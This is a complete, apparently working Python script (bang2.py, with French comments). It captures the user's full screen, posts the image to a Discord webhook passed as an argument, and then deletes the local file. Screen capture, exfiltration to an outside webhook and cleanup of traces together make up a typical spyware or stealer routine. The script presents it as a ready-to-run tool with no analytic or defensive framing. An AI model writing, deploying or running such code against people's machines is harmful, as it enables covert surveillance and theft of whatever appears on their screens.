import sys
import requests
import os
from datetime import datetime

def capture_screenshot():
    """Capture une capture d'écran et la sauvegarde localement."""
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        filename = f"C:\\Users\\Public\\screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
        print(f"Capture d'écran sauvegardée : {filename}")
        return filename
    except Exception as e:
        print(f"Erreur lors de la capture d'écran : {e}")
        return None

def send_to_discord(webhook_url, file_path):
    """Envoie le fichier capturé à un webhook Discord."""
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(webhook_url, files={"file": f})
        if response.status_code == 200:
            print("Capture d'écran envoyée avec succès.")
        else:
            print(f"Échec de l'envoi : {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python bang2.py <webhook_url>")
        return

    webhook_url = sys.argv[1]
    print(f"Webhook URL : {webhook_url}")
    print("Capture d'écran en cours...")

    screenshot_path = capture_screenshot()
    if screenshot_path:
        print("Envoi au webhook Discord...")
        send_to_discord(webhook_url, screenshot_path)
        print("Nettoyage des fichiers locaux...")
        os.remove(screenshot_path)
    else:
        print("Aucune capture d'écran n'a été générée.")

if __name__ == "__main__":
    main()
